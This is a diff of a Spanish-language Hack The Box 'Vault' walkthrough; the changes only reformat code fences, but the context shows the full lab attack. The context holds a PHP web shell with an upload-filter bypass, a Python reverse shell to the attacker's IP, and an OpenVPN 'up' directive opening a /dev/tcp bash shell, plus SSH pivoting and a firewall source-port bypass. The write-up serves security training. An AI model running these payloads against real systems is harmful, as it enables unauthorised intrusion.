@@ -26,7 +26,7 @@ Su tarjeta de presentación es:
 
 Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:
 
-```text
+``` text
 root@laptop:~# nmap -sS -p- -n --open -v 10.10.10.109
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-26 23:29 CST
 Initiating Ping Scan at 23:29
@@ -60,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 136.10 seconds
 
 Doble check con `masscan`:
 
-```text
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.109
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-27 04:25:11 GMT
  -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
@@ -80,7 +80,7 @@ Como podemos ver los puertos son los mismos, por lo que iniciamos por identifica
 
 Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):
 
-```text
+``` text
 root@laptop:~# nmap -sV -sC -p80,22 -n 10.10.10.109 --script discovery
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-26 23:33 CST
 Nmap scan report for 10.10.10.109
@@ -126,7 +126,7 @@ Como podemos ver tenemos un Servidor apache 2.4.18 y un servidor openssh 7.2.p2.
 
 Veamos que tenemos en el home del servidor web:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ http http://10.10.10.109/index.php
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -151,7 +151,7 @@ Nos indica que la pagina se encuentra en construcción, que se trata de una empr
 
 Lo primero que intente fue cambiar el header para buscar la pagina en construcción, pero no tuve éxito:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ http 10.10.10.109 Host:sparklays.com
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -173,7 +173,7 @@ We are proud to announce our first client: Sparklays
 
 Continué lanzando un `dirb` sobre home, pero no encontró resultados.
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ dirb http://10.10.10.109/
 
 -----------------
@@ -200,7 +200,7 @@ DOWNLOADED: 4612 - FOUND: 2
 
 Apunte a la carpeta con el nombre del sitio y bang, un 301 y un 403 respectivamente:
 
-```html
+``` html
 xbytemx@laptop:~/htb/vault$ http http://10.10.10.109/sparklays
 HTTP/1.1 301 Moved Permanently
 Connection: Keep-Alive
@@ -245,7 +245,7 @@ on this server.<br />
 
 Lance un `gobuster` sobre este directorio:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ ~/tools/gobuster -t 20 -x html,php,txt -u http://10.10.10.109/sparklays/ -w ~/git/SecLists/Discovery/Web-Content/common.txt
 
 =====================================================
@@ -291,7 +291,7 @@ Encontramos una carpeta y 2 archivos: _design_, _admin.php_ y _login.php_
 
 Iniciemos validando _admin.php_:
 
-```HTML
+``` html
 xbytemx@laptop:~/htb/vault$ http http://10.10.10.109/sparklays/admin.php
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -320,7 +320,7 @@ Vary: Accept-Encoding
 
 Parece que se trata de un form que acepta peticiones GET, probemos enviadole admin/admin:
 
-```html
+``` html
 xbytemx@laptop:~/htb/vault$ http 'http://10.10.10.109/sparklays/admin.php?username=admin&password=admin'
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -350,7 +350,7 @@ Como podemos ver no pasa nada. De hecho si prestamos atención al botón, veremo
 
 El siguiente archivo es _login.php_:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ http http://10.10.10.109/sparklays/login.php
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -367,7 +367,7 @@ Directo y sin mas nos da un "access denied". Como no conocemos o tenemos indicio
 
 En design hacemos las pruebas habituales y vemos un resultado muy parecido a sparklays:
 
-```html
+``` html
 xbytemx@laptop:~/htb/vault$ http http://10.10.10.109/sparklays/design
 HTTP/1.1 301 Moved Permanently
 Connection: Keep-Alive
@@ -412,7 +412,7 @@ on this server.<br />
 
 Usando `gobuster` sobre este directorio:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ ~/tools/gobuster -t 20 -x html,php,txt -u http://10.10.10.109/sparklays/design/ -w ~/git/SecLists/Discovery/Web-Content/common.txt
 
 =====================================================
@@ -453,7 +453,7 @@ Como podemos ver, hemos encontrado un archivo y un directorio; _uploads_ y _desi
 
 Comenzando ahora en su lugar por el directorio _uploads_ y lanzando directamente un `gobuster`:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ ~/tools/gobuster -t 20 -x html,php,txt -u http://10.10.10.109/sparklays/design/uploads/ -w ~/git/SecLists/Discovery/Web-Content/common.txt
 
 =====================================================
@@ -492,7 +492,7 @@ No encontramos nada.
 
 Ahora si, pasemos al archivo design.html con un `httpie`:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ http  http://10.10.10.109/sparklays/design/design.html
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
@@ -514,7 +514,7 @@ Vary: Accept-Encoding
 
 Tenemos una referencia a un archivo que no encontramos por gobuster, sigamos el rastro:
 
-```html
+``` html
 xbytemx@laptop:~/htb/vault$ http  http://10.10.10.109/sparklays/design/changelogo.php
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -552,7 +552,7 @@ Tenemos un form para subir archivos, lo cual hace sentido con la carpeta _upload
 
 Subamos una pequeña shell de php:
 
-```html
+``` html
 xbytemx@laptop:~/htb/vault$ printf '<?php system($_GET["cmd"]); ?>' > miaushell.php
 xbytemx@laptop:~/htb/vault$ http -v -f POST http://10.10.10.109/sparklays/design/changelogo.php file@miaushell.php submit="upload file"
 POST /sparklays/design/changelogo.php HTTP/1.1
@@ -608,7 +608,7 @@ Tendremos un mensaje de **sorry that file type is not allowed** ):
 
 Probablemente se trate de algún filtro, por lo que revisando la [mágica documentación](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf), podremos ver que hay otras extensiones para php, como php5:
 
-```html
+``` html
 xbytemx@laptop:~/htb/vault$ printf '<?php system($_GET["cmd"]); ?>' > dgdfgdfgdfgd.php5
 xbytemx@laptop:~/htb/vault$ http -v -f POST http://10.10.10.109/sparklays/design/changelogo.php file@dgdfgdfgdfgd.php5 submit="upload file"
 POST /sparklays/design/changelogo.php HTTP/1.1
@@ -662,7 +662,7 @@ The file was uploaded successfully<br><br><!DOCTYPE html>
 
 Ahora que hemos podido subir nuestra shell, veamos si podemos ejecutar comandos sobre ella:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ http "http://10.10.10.109/sparklays/design/uploads/dgdfgdfgdfgd.php5?cmd=uname"
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -682,13 +682,13 @@ Excelente, ahora que podemos ejecutar comandos sobre el servidor, podemos llamar
 
 Para ejecutar mi reverse shell, use `urlencode` para no morir con problemas de encoding durante la ejecución. También provee previamente si podía ejecutar python, con `python --version`. Con esta validación y soporte de encoding, ejecutamos el siguiente comando:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ http "http://10.10.10.109/sparklays/design/uploads/dgdfgdfgdfgd.php5?cmd="$(urlencode "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.12.244\",3001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
 ```
 
 En mi maquina, esperando por la conexión y posteriormente haciendo el upgrade de mi tty:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ ncat -vlnp 3001
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::3001
@@ -704,7 +704,7 @@ www-data@ubuntu:/var/www/html/sparklays/design/uploads$
 
 Ahora que estamos dentro, busquemos en la carpeta home por mas información sobre la maquina:
 
-```text
+``` text
 www-data@ubuntu:/var/www/html/sparklays/design/uploads$ cd /home
 cd /home
 www-data@ubuntu:/home$ ls -lah
@@ -720,7 +720,7 @@ drwxr-xr-x 18 dave dave 4.0K Sep  3  2018 dave
 
 Empecemos por **dave**:
 
-```text
+``` text
 www-data@ubuntu:/home$ cd dave
 cd dave
 www-data@ubuntu:/home/dave$ ls -lahR
@@ -816,7 +816,7 @@ drwxr-xr-x 18 dave dave 4.0K Sep  3  2018 ..
 
 Esos archivos en Desktop se ven sospechosos, veamos que hay dentro:
 
-```text
+``` text
 www-data@ubuntu:/home/dave$ more Desktop/*
 more Desktop/*
 ::::::::::::::
@@ -840,7 +840,7 @@ Dav3therav3123
 
 Parece que el archivo ssh tiene unas credenciales, probemos las credenciales en la maquina:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ ssh dave@10.10.10.109
 dave@10.10.10.109's password:
 Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-45-generic x86_64)
@@ -867,7 +867,7 @@ Ahora que hemos podido ingresar en _ubuntu_, y que los archivos encontrados nos 
 
 Interfaces y rutas:
 
-```text
+``` text
 dave@ubuntu:~$ ip a s
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -916,7 +916,7 @@ Para llegar a los *Servers* usamos la interface virbr0, la cual tiene una direcc
 
 Veamos las conexiones:
 
-```text
+``` text
 dave@ubuntu:~/Desktop$ netstat -pltune
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
@@ -943,7 +943,7 @@ udp6       0      0 :::34539                :::*                                
 
 Interesante, en localhost tenemos varios servicios corriendo, inclusive algunos ejecutandose desde el usuario con ID 64055. Veamos quien es este usuario:
 
-```text
+``` text
 dave@ubuntu:~$ cat /etc/passwd | grep 64055
 libvirt-qemu:x:64055:129:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
 ```
@@ -952,7 +952,7 @@ Vemos que se trata de libvirt-qemu, lo cual nos hace _click_ con el nombre de la
 
 Veamos los procesos de las maquinas virtuales:
 
-```text
+``` text
 dave@ubuntu:~/Desktop$ ps -fea
 
 {OMITIDO}
@@ -979,7 +979,7 @@ El spice es importante porque básicamente podemos conectarnos a cualquier maqui
 
 Veamos que tenemos en nuestra tabla de ARP:
 
-```text
+``` text
 dave@ubuntu:~$ arp -a
 ? (192.168.122.4) at 52:54:00:17:ab:49 [ether] on virbr0
 ? (10.10.10.2) at 00:50:56:aa:9c:8d [ether] on ens33
@@ -1000,7 +1000,7 @@ graph TD;
 
 Ahora que hemos comprendido que desde ubuntu tenemos que llegar a DNS y Firewall, viene el problema de que no sabemos nada mas que sus direcciones IP. Enumerando un poco mas el servicio SSH que estamos usando actualmente, encontraremos que para nuestra fortuna algunas opciones están habilitadas para hacer una dirección de puertos:
 
-```text
+``` text
 dave@ubuntu:~$ cat /etc/ssh/sshd_config | grep -Ev '^$|^#'
 Port 22
 Protocol 2
@@ -1042,7 +1042,7 @@ Esto nos permite establecer una VPN de SSH en la cual mandamos sobre una conexi�
 
 Primero definimos un puerto que acepte todas las conexiones y que se convierta en el listener o en el proxy:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ ssh -f -N -D 9050 dave@10.10.10.109
 dave@10.10.10.109's password:
 
@@ -1055,7 +1055,7 @@ dave@10.10.10.109's password:
 
 Después usando proxychains, el cual por defecto usa el puerto 9050 y la ip 127.0.0.1, ejecuta sobre la conexión un nmap por ejemplo:
 
-```text
+``` text
 root@laptop:~# proxychains nmap -sT --open -n -v 192.168.122.5
 ProxyChains-3.1 (http://proxychains.sf.net)
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-17 17:39 CST
@@ -1074,7 +1074,7 @@ Las opciones son muy parecida a las anteriores, con la diferencia que para este 
 
 También en este escaneo hacia Firewall, podemos ver que ningún puerto contesto como abierto. Continuemos sobre DNS:
 
-```text
+``` text
 # Nmap 7.70 scan initiated Sun Mar 17 17:42:45 2019 as: nmap -sT --open -n -v -oN DNS-proxychains-nmap.nmap 192.168.122.4
 Nmap scan report for 192.168.122.4
 Host is up (0.15s latency).
@@ -1091,7 +1091,7 @@ Ahora en la salida de este archivo (_DNS-proxychains-nmap.nmap_) podemos ver que
 
 Utilizando `httpie` exploremos el servidor web:
 
-```html
+``` html
 xbytemx@laptop:~/htb/vault$ proxychains http 192.168.122.4
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:80-<><>-OK
@@ -1113,7 +1113,7 @@ Vary: Accept-Encoding
 
 Encontramos desde index.html, dos archivos más: _vpnconfig.php_ y _dns-config.php_. Veamos su contenido:
 
-```html
+``` html
 xbytemx@laptop:~/htb/vault$ proxychains http 192.168.122.4/dns-config.php
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:80-<><>-OK
@@ -1169,7 +1169,7 @@ Parece que tenemos un configurador de OpenVPN (.ovpn) justo como el que hacktheb
 
 Googleando un poco encontraremos el siguiente [articulo](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da), el cual nos explica como aprovecharnos y realizar un RCE sobre un servidor de OVPN. Usando esta técnica, desarrolle el siguiente archivo ovpn:
 
-```text
+``` text
 remote 192.168.122.1
 dev tun
 nobind
@@ -1179,7 +1179,7 @@ up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/3001 0<&1 2>&1&'"
 
 Tenemos el comando a ejecutarse después de que la vpn se levante, que es básicamente un reverse shell y el remote de la conexión, osea la maquina _ubuntu_. Levantamos un netcat para recibir la conexión en _ubuntu_ y usando proxychains subimos via post el contenido del archivo ovpn:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ proxychains http -f POST "http://192.168.122.4/vpnconfig.php?function=testvpn" submit="Update file" text="remote 192.168.122.1\ndev tun\nnobind\nscript-security 2\nup \"/bin/bash -c \'/bin/bash -i > /dev/tcp/192.168.122.1/3001 0<&1 2>&1&\'\""
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:80-<><>-OK
@@ -1189,7 +1189,7 @@ http: error: Request timed out (30s).
 
 En nuestro listener debemos recibir la conexión remota de DNS:
 
-```text
+``` text
 dave@ubuntu:~$ nc -vlnp 3001
 Listening on [0.0.0.0] (family 0, port 3001)
 Connection from [192.168.122.4] port 3001 [tcp/*] accepted (family 2, sport 33836)
@@ -1206,7 +1206,7 @@ yey ya somos root! pero en DNS ):
 
 Ahora que hemos ingresado en nuestra primera maquina, veamos que encontramos por aquí:
 
-```text
+``` text
 root@DNS:/var/www/html# cd /home
 cd /home
 root@DNS:/home# ls
@@ -1227,7 +1227,7 @@ dav3gerous567
 
 Parece que tenemos otras credenciales para entrar por SSH.
 
-```text
+``` text
 dave@ubuntu:~$ ssh dave@192.168.122.4
 dave@192.168.122.4's password:
 Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)
@@ -1248,7 +1248,7 @@ dave@DNS:~$
 
 # cat user.txt
 
-```text
+``` text
 root@DNS:/home/dave# cat user.txt
 cat user.txt
 ```
@@ -1256,7 +1256,7 @@ cat user.txt
 
 Validemos que puede hacer _dave_ en esta maquina o porque es tan importante:
 
-```text
+``` text
 root@DNS:/home/dave# sudo -l -U dave
 sudo -l -U dave
 Matching Defaults entries for dave on DNS:
@@ -1271,7 +1271,7 @@ Gracias a `sudo -s` podremos regresar a root en cualquier momento usando a _dave
 
 Después de revolotear un poco el gallinero y tratar de identificar si DNS se conecta a Vault o a Firewall, encontraremos algo interesante sobre las rutas:
 
-```text
+``` text
 root@DNS:/home/dave# ip r
 ip r
 192.168.5.0/24 via 192.168.122.5 dev ens3
@@ -1282,7 +1282,7 @@ Esto nos indica que DNS se puede conectar a la red entre Firewall y Vault, mas a
 
 Estuve buscando sobre etc y var referencias a la red 192.168.5.0/24, hasta que di con auth.log:
 
-```text
+``` text
 root@DNS:/home/dave# find /var/log/ -type f -exec grep "192.168.5." {} \;
 find /var/log/ -type f -exec grep "192.168.5." {} \;
 Binary file /var/log/auth.log matches
@@ -1344,7 +1344,7 @@ sequenceDiagram
 
 Ahora que hemos comprendido mejor como podríamos bypasear las reglas del firewall, podemos construir un listener del puerto 987 de Vault:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ proxychains ssh dave@192.168.122.4 "ncat -l 3001 --sh-exec \"ncat 192.168.5.2 987 --source-port=4444\""
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:22-<><>-OK
@@ -1362,7 +1362,7 @@ Con un nmap veremos que el servicio del puerto 987 de la 192.168.5.2 es en reali
 
 Usaremos las credenciales que encontramos en DNS sobre dave (recordemos los logs de auth):
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ proxychains ssh dave@192.168.122.4 -p3001
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:3001-<><>-OK
@@ -1391,7 +1391,7 @@ dave@vault:~$
 
 Ya que entramos a Vault, encontramos un archivo en el home de dave, el cual es un archivo gpg. Lo descargamos:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ proxychains scp -P 3001 dave@192.168.122.4:/home/dave/root.txt.gpg .
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:3001-<><>-OK
@@ -1403,7 +1403,7 @@ root.txt.gpg                                                                    
 
 Explorando las maquinas, encontraremos que en ubuntu podemos acceder al _secring_ de dave, por lo que lo descargamos e importamos:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ gpg --import ubuntu-gnupg/secring.gpg
 gpg: clave 9067DED00FDFBFE4: clave pública "david <dave@david.com>" importada
 gpg: clave 9067DED00FDFBFE4: clave secreta importada
@@ -1415,7 +1415,7 @@ gpg:   claves secretas importadas: 1
 
 Procedemos a usar la clave secreta importada para descifrar el archivo root.txt.gpg:
 
-```text
+``` text
 xbytemx@laptop:~/htb/vault$ gpg -d root.txt.gpg > root.txt
 gpg: cifrado con clave de 4096 bits RSA, ID C778C610D1EB1F03, creada el 2018-07-24
       "david <dave@david.com>"
